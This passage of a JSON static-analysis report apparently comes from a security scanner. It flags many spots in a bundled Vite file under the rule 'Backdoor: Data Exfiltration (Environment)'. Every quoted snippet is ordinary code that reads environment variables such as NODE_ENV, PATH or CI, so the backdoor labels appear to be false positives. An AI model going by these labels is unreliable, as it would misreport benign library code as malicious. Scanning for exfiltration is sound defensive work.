                    "text": "  let config = inlineConfig;\n  let configFileDependencies = [];\n  let mode = inlineConfig.mode || defaultMode;\n  const isNodeEnvSet = !!process.env.NODE_ENV;\n  const packageCache = /* @__PURE__ */ new Map();\n  if (!isNodeEnvSet) {\n    process.env.NODE_ENV = defaultNodeEnv;\n",
                    "rendered": {
                      "text": "  let config = inlineConfig;\n  let configFileDependencies = [];\n  let mode = inlineConfig.mode || defaultMode;\n  const isNodeEnvSet = !!process.env.NODE_ENV;\n  const packageCache = /* @__PURE__ */ new Map();\n  if (!isNodeEnvSet) {\n    process.env.NODE_ENV = defaultNodeEnv;\n",
                      "markdown": "`  let config = inlineConfig;\n  let configFileDependencies = [];\n  let mode = inlineConfig.mode || defaultMode;\n  const isNodeEnvSet = !!process.env.NODE_ENV;\n  const packageCache = /* @__PURE__ */ new Map();\n  if (!isNodeEnvSet) {\n    process.env.NODE_ENV = defaultNodeEnv;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 65458,
                  "startColumn": 39,
                  "endLine": 65458,
                  "endColumn": 50,
                  "snippet": {
                    "text": "  `statically analyzed`\n];\nfunction clearLine() {\n  const tty = process.stdout.isTTY && !process.env.CI;\n  if (tty) {\n    process.stdout.clearLine(0);\n    process.stdout.cursorTo(0);\n",
                    "rendered": {
                      "text": "  `statically analyzed`\n];\nfunction clearLine() {\n  const tty = process.stdout.isTTY && !process.env.CI;\n  if (tty) {\n    process.stdout.clearLine(0);\n    process.stdout.cursorTo(0);\n",
                      "markdown": "`  `statically analyzed`\n];\nfunction clearLine() {\n  const tty = process.stdout.isTTY && !process.env.CI;\n  if (tty) {\n    process.stdout.clearLine(0);\n    process.stdout.cursorTo(0);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62977,
                  "startColumn": 6,
                  "endLine": 62977,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  for (const hook of config.getSortedPluginHooks(\"configureServer\")) {\n    postHooks.push(await hook(reflexServer));\n  }\n  if (process.env.DEBUG) {\n    middlewares.use(timeMiddleware(root));\n  }\n  const { cors } = serverConfig;\n",
                    "rendered": {
                      "text": "  for (const hook of config.getSortedPluginHooks(\"configureServer\")) {\n    postHooks.push(await hook(reflexServer));\n  }\n  if (process.env.DEBUG) {\n    middlewares.use(timeMiddleware(root));\n  }\n  const { cors } = serverConfig;\n",
                      "markdown": "`  for (const hook of config.getSortedPluginHooks(\"configureServer\")) {\n    postHooks.push(await hook(reflexServer));\n  }\n  if (process.env.DEBUG) {\n    middlewares.use(timeMiddleware(root));\n  }\n  const { cors } = serverConfig;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 55278,
                  "startColumn": 40,
                  "endLine": 55278,
                  "endColumn": 51,
                  "snippet": {
                    "text": "  validation.exports.isValidUTF8 = function (buf) {\n    return buf.length < 24 ? _isValidUTF8(buf) : isUtf8(buf);\n  };\n} /* istanbul ignore else  */ else if (!process.env.WS_NO_UTF_8_VALIDATE) {\n  try {\n    const isValidUTF8 = require('utf-8-validate');\n\n",
                    "rendered": {
                      "text": "  validation.exports.isValidUTF8 = function (buf) {\n    return buf.length < 24 ? _isValidUTF8(buf) : isUtf8(buf);\n  };\n} /* istanbul ignore else  */ else if (!process.env.WS_NO_UTF_8_VALIDATE) {\n  try {\n    const isValidUTF8 = require('utf-8-validate');\n\n",
                      "markdown": "`  validation.exports.isValidUTF8 = function (buf) {\n    return buf.length < 24 ? _isValidUTF8(buf) : isUtf8(buf);\n  };\n} /* istanbul ignore else  */ else if (!process.env.WS_NO_UTF_8_VALIDATE) {\n  try {\n    const isValidUTF8 = require('utf-8-validate');\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 54550,
                  "startColumn": 5,
                  "endLine": 54550,
                  "endColumn": 16,
                  "snippet": {
                    "text": "};\n\n/* istanbul ignore else  */\nif (!process.env.WS_NO_BUFFER_UTIL) {\n  try {\n    const bufferUtil = require('bufferutil');\n\n",
                    "rendered": {
                      "text": "};\n\n/* istanbul ignore else  */\nif (!process.env.WS_NO_BUFFER_UTIL) {\n  try {\n    const bufferUtil = require('bufferutil');\n\n",
                      "markdown": "`};\n\n/* istanbul ignore else  */\nif (!process.env.WS_NO_BUFFER_UTIL) {\n  try {\n    const bufferUtil = require('bufferutil');\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 54134,
                  "startColumn": 52,
                  "endLine": 54134,
                  "endColumn": 63,
                  "snippet": {
                    "text": "}\n\nfunction bindCLIShortcuts(server, opts) {\n  if (!server.httpServer || !process.stdin.isTTY || process.env.CI) {\n    return;\n  }\n  const isDev = isDevServer(server);\n",
                    "rendered": {
                      "text": "}\n\nfunction bindCLIShortcuts(server, opts) {\n  if (!server.httpServer || !process.stdin.isTTY || process.env.CI) {\n    return;\n  }\n  const isDev = isDevServer(server);\n",
                      "markdown": "`}\n\nfunction bindCLIShortcuts(server, opts) {\n  if (!server.httpServer || !process.stdin.isTTY || process.env.CI) {\n    return;\n  }\n  const isDev = isDevServer(server);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 54048,
                  "startColumn": 51,
                  "endLine": 54048,
                  "endColumn": 62,
                  "snippet": {
                    "text": "  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n    const browserArgs = process.env.BROWSER_ARGS ? process.env.BROWSER_ARGS.split(\" \") : [];\n    startBrowserProcess(browser, browserArgs, url, logger);\n  }\n}\n",
                    "rendered": {
                      "text": "  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n    const browserArgs = process.env.BROWSER_ARGS ? process.env.BROWSER_ARGS.split(\" \") : [];\n    startBrowserProcess(browser, browserArgs, url, logger);\n  }\n}\n",
                      "markdown": "`  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n    const browserArgs = process.env.BROWSER_ARGS ? process.env.BROWSER_ARGS.split(\" \") : [];\n    startBrowserProcess(browser, browserArgs, url, logger);\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 54048,
                  "startColumn": 24,
                  "endLine": 54048,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n    const browserArgs = process.env.BROWSER_ARGS ? process.env.BROWSER_ARGS.split(\" \") : [];\n    startBrowserProcess(browser, browserArgs, url, logger);\n  }\n}\n",
                    "rendered": {
                      "text": "  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n    const browserArgs = process.env.BROWSER_ARGS ? process.env.BROWSER_ARGS.split(\" \") : [];\n    startBrowserProcess(browser, browserArgs, url, logger);\n  }\n}\n",
                      "markdown": "`  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n    const browserArgs = process.env.BROWSER_ARGS ? process.env.BROWSER_ARGS.split(\" \") : [];\n    startBrowserProcess(browser, browserArgs, url, logger);\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 54044,
                  "startColumn": 18,
                  "endLine": 54044,
                  "endColumn": 29,
                  "snippet": {
                    "text": "var spawn$1 = /*@__PURE__*/getDefaultExportFromCjs(crossSpawnExports);\n\nfunction openBrowser(url, opt, logger) {\n  const browser = process.env.BROWSER || \"\";\n  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n",
                    "rendered": {
                      "text": "var spawn$1 = /*@__PURE__*/getDefaultExportFromCjs(crossSpawnExports);\n\nfunction openBrowser(url, opt, logger) {\n  const browser = process.env.BROWSER || \"\";\n  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n",
                      "markdown": "`var spawn$1 = /*@__PURE__*/getDefaultExportFromCjs(crossSpawnExports);\n\nfunction openBrowser(url, opt, logger) {\n  const browser = process.env.BROWSER || \"\";\n  if (browser.toLowerCase().endsWith(\".js\")) {\n    executeNodeScript(browser, url, logger);\n  } else if (browser.toLowerCase() !== \"none\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53909,
                  "startColumn": 25,
                  "endLine": 53909,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        const shellCommand = [parsed.command].concat(parsed.args).join(' ');\n\n        parsed.args = ['/d', '/s', '/c', `\"${shellCommand}\"`];\n        parsed.command = process.env.comspec || 'cmd.exe';\n        parsed.options.windowsVerbatimArguments = true; // Tell node's spawn that the arguments are already escaped\n    }\n\n",
                    "rendered": {
                      "text": "        const shellCommand = [parsed.command].concat(parsed.args).join(' ');\n\n        parsed.args = ['/d', '/s', '/c', `\"${shellCommand}\"`];\n        parsed.command = process.env.comspec || 'cmd.exe';\n        parsed.options.windowsVerbatimArguments = true; // Tell node's spawn that the arguments are already escaped\n    }\n\n",
                      "markdown": "`        const shellCommand = [parsed.command].concat(parsed.args).join(' ');\n\n        parsed.args = ['/d', '/s', '/c', `\"${shellCommand}\"`];\n        parsed.command = process.env.comspec || 'cmd.exe';\n        parsed.options.windowsVerbatimArguments = true; // Tell node's spawn that the arguments are already escaped\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53719,
                  "startColumn": 38,
                  "endLine": 53719,
                  "endColumn": 49,
                  "snippet": {
                    "text": "const getPathKey = pathKeyExports;\n\nfunction resolveCommandAttempt(parsed, withoutPathExt) {\n    const env = parsed.options.env || process.env;\n    const cwd = process.cwd();\n    const hasCustomCwd = parsed.options.cwd != null;\n    // Worker threads do not have process.chdir()\n",
                    "rendered": {
                      "text": "const getPathKey = pathKeyExports;\n\nfunction resolveCommandAttempt(parsed, withoutPathExt) {\n    const env = parsed.options.env || process.env;\n    const cwd = process.cwd();\n    const hasCustomCwd = parsed.options.cwd != null;\n    // Worker threads do not have process.chdir()\n",
                      "markdown": "`const getPathKey = pathKeyExports;\n\nfunction resolveCommandAttempt(parsed, withoutPathExt) {\n    const env = parsed.options.env || process.env;\n    const cwd = process.cwd();\n    const hasCustomCwd = parsed.options.cwd != null;\n    // Worker threads do not have process.chdir()\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53698,
                  "startColumn": 36,
                  "endLine": 53698,
                  "endColumn": 47,
                  "snippet": {
                    "text": "var pathKey$1 = {exports: {}};\n\nconst pathKey = (options = {}) => {\n\tconst environment = options.env || process.env;\n\tconst platform = options.platform || process.platform;\n\n\tif (platform !== 'win32') {\n",
                    "rendered": {
                      "text": "var pathKey$1 = {exports: {}};\n\nconst pathKey = (options = {}) => {\n\tconst environment = options.env || process.env;\n\tconst platform = options.platform || process.platform;\n\n\tif (platform !== 'win32') {\n",
                      "markdown": "`var pathKey$1 = {exports: {}};\n\nconst pathKey = (options = {}) => {\n\tconst environment = options.env || process.env;\n\tconst platform = options.platform || process.platform;\n\n\tif (platform !== 'win32') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53595,
                  "startColumn": 21,
                  "endLine": 53595,
                  "endColumn": 32,
                  "snippet": {
                    "text": "      ]\n    );\n  const pathExtExe = isWindows\n    ? opt.pathExt || process.env.PATHEXT || '.EXE;.CMD;.BAT;.COM'\n    : '';\n  const pathExt = isWindows ? pathExtExe.split(colon) : [''];\n\n",
                    "rendered": {
                      "text": "      ]\n    );\n  const pathExtExe = isWindows\n    ? opt.pathExt || process.env.PATHEXT || '.EXE;.CMD;.BAT;.COM'\n    : '';\n  const pathExt = isWindows ? pathExtExe.split(colon) : [''];\n\n",
                      "markdown": "`      ]\n    );\n  const pathExtExe = isWindows\n    ? opt.pathExt || process.env.PATHEXT || '.EXE;.CMD;.BAT;.COM'\n    : '';\n  const pathExt = isWindows ? pathExtExe.split(colon) : [''];\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53590,
                  "startColumn": 24,
                  "endLine": 53590,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      [\n        // windows always checks the cwd first\n        ...(isWindows ? [process.cwd()] : []),\n        ...(opt.path || process.env.PATH ||\n          /* istanbul ignore next: very unusual */ '').split(colon),\n      ]\n    );\n",
                    "rendered": {
                      "text": "      [\n        // windows always checks the cwd first\n        ...(isWindows ? [process.cwd()] : []),\n        ...(opt.path || process.env.PATH ||\n          /* istanbul ignore next: very unusual */ '').split(colon),\n      ]\n    );\n",
                      "markdown": "`      [\n        // windows always checks the cwd first\n        ...(isWindows ? [process.cwd()] : []),\n        ...(opt.path || process.env.PATH ||\n          /* istanbul ignore next: very unusual */ '').split(colon),\n      ]\n    );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53571,
                  "startColumn": 4,
                  "endLine": 53571,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\nconst isWindows = process.platform === 'win32' ||\n    process.env.OSTYPE === 'cygwin' ||\n    process.env.OSTYPE === 'msys';\n\nconst path$2 = require$$0$4;\nconst COLON = isWindows ? ';' : ':';\n",
                    "rendered": {
                      "text": "\nconst isWindows = process.platform === 'win32' ||\n    process.env.OSTYPE === 'cygwin' ||\n    process.env.OSTYPE === 'msys';\n\nconst path$2 = require$$0$4;\nconst COLON = isWindows ? ';' : ':';\n",
                      "markdown": "`\nconst isWindows = process.platform === 'win32' ||\n    process.env.OSTYPE === 'cygwin' ||\n    process.env.OSTYPE === 'msys';\n\nconst path$2 = require$$0$4;\nconst COLON = isWindows ? ';' : ':';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53570,
                  "startColumn": 4,
                  "endLine": 53570,
                  "endColumn": 15,
                  "snippet": {
                    "text": "}\n\nconst isWindows = process.platform === 'win32' ||\n    process.env.OSTYPE === 'cygwin' ||\n    process.env.OSTYPE === 'msys';\n\nconst path$2 = require$$0$4;\n",
                    "rendered": {
                      "text": "}\n\nconst isWindows = process.platform === 'win32' ||\n    process.env.OSTYPE === 'cygwin' ||\n    process.env.OSTYPE === 'msys';\n\nconst path$2 = require$$0$4;\n",
                      "markdown": "`}\n\nconst isWindows = process.platform === 'win32' ||\n    process.env.OSTYPE === 'cygwin' ||\n    process.env.OSTYPE === 'msys';\n\nconst path$2 = require$$0$4;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53424,
                  "startColumn": 23,
                  "endLine": 53424,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n\tfunction checkPathExt (path, options) {\n\t  var pathext = options.pathExt !== undefined ?\n\t    options.pathExt : process.env.PATHEXT;\n\n\t  if (!pathext) {\n\t    return true\n",
                    "rendered": {
                      "text": "\n\tfunction checkPathExt (path, options) {\n\t  var pathext = options.pathExt !== undefined ?\n\t    options.pathExt : process.env.PATHEXT;\n\n\t  if (!pathext) {\n\t    return true\n",
                      "markdown": "`\n\tfunction checkPathExt (path, options) {\n\t  var pathext = options.pathExt !== undefined ?\n\t    options.pathExt : process.env.PATHEXT;\n\n\t  if (!pathext) {\n\t    return true\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53218,
                  "startColumn": 6,
                  "endLine": 53218,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n\t\tcommand = isWsl ?\n\t\t\t`${mountPoint}c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe` :\n\t\t\t`${process.env.SYSTEMROOT}\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell`;\n\n\t\tcliArguments.push(\n\t\t\t'-NoProfile',\n",
                    "rendered": {
                      "text": "\n\t\tcommand = isWsl ?\n\t\t\t`${mountPoint}c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe` :\n\t\t\t`${process.env.SYSTEMROOT}\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell`;\n\n\t\tcliArguments.push(\n\t\t\t'-NoProfile',\n",
                      "markdown": "`\n\t\tcommand = isWsl ?\n\t\t\t`${mountPoint}c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe` :\n\t\t\t`${process.env.SYSTEMROOT}\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell`;\n\n\t\tcliArguments.push(\n\t\t\t'-NoProfile',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53045,
                  "startColumn": 4,
                  "endLine": 53045,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\t}\n};\n\nif (process.env.__IS_WSL_TEST__) {\n\tisWsl$2.exports = isWsl$1;\n} else {\n\tisWsl$2.exports = isWsl$1();\n",
                    "rendered": {
                      "text": "\t}\n};\n\nif (process.env.__IS_WSL_TEST__) {\n\tisWsl$2.exports = isWsl$1;\n} else {\n\tisWsl$2.exports = isWsl$1();\n",
                      "markdown": "`\t}\n};\n\nif (process.env.__IS_WSL_TEST__) {\n\tisWsl$2.exports = isWsl$1;\n} else {\n\tisWsl$2.exports = isWsl$1();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 51104,
                  "startColumn": 12,
                  "endLine": 51104,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  const optimizeDeps2 = getDepOptimizationConfig(config, ssr);\n  const content = JSON.stringify(\n    {\n      mode: process.env.NODE_ENV || config.mode,\n      root: config.root,\n      resolve: config.resolve,\n      assetsInclude: config.assetsInclude,\n",
                    "rendered": {
                      "text": "  const optimizeDeps2 = getDepOptimizationConfig(config, ssr);\n  const content = JSON.stringify(\n    {\n      mode: process.env.NODE_ENV || config.mode,\n      root: config.root,\n      resolve: config.resolve,\n      assetsInclude: config.assetsInclude,\n",
                      "markdown": "`  const optimizeDeps2 = getDepOptimizationConfig(config, ssr);\n  const content = JSON.stringify(\n    {\n      mode: process.env.NODE_ENV || config.mode,\n      root: config.root,\n      resolve: config.resolve,\n      assetsInclude: config.assetsInclude,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 51097,
                  "startColumn": 9,
                  "endLine": 51097,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  // Included in lockfile\n  { name: \"bun.lockb\", checkPatches: true, manager: \"bun\" }\n].sort((_, { manager }) => {\n  return process.env.npm_config_user_agent?.startsWith(manager) ? 1 : -1;\n});\nconst lockfileNames = lockfileFormats.map((l) => l.name);\nfunction getConfigHash(config, ssr) {\n",
                    "rendered": {
                      "text": "  // Included in lockfile\n  { name: \"bun.lockb\", checkPatches: true, manager: \"bun\" }\n].sort((_, { manager }) => {\n  return process.env.npm_config_user_agent?.startsWith(manager) ? 1 : -1;\n});\nconst lockfileNames = lockfileFormats.map((l) => l.name);\nfunction getConfigHash(config, ssr) {\n",
                      "markdown": "`  // Included in lockfile\n  { name: \"bun.lockb\", checkPatches: true, manager: \"bun\" }\n].sort((_, { manager }) => {\n  return process.env.npm_config_user_agent?.startsWith(manager) ? 1 : -1;\n});\nconst lockfileNames = lockfileFormats.map((l) => l.name);\nfunction getConfigHash(config, ssr) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 50809,
                  "startColumn": 43,
                  "endLine": 50809,
                  "endColumn": 54,
                  "snippet": {
                    "text": "  );\n  if (optimizerContext.cancelled) return { context: void 0, idToExports };\n  const define = {\n    \"process.env.NODE_ENV\": JSON.stringify(process.env.NODE_ENV || config.mode)\n  };\n  const platform = ssr && config.ssr?.target !== \"webworker\" ? \"node\" : \"browser\";\n  const external = [...optimizeDeps2?.exclude ?? []];\n",
                    "rendered": {
                      "text": "  );\n  if (optimizerContext.cancelled) return { context: void 0, idToExports };\n  const define = {\n    \"process.env.NODE_ENV\": JSON.stringify(process.env.NODE_ENV || config.mode)\n  };\n  const platform = ssr && config.ssr?.target !== \"webworker\" ? \"node\" : \"browser\";\n  const external = [...optimizeDeps2?.exclude ?? []];\n",
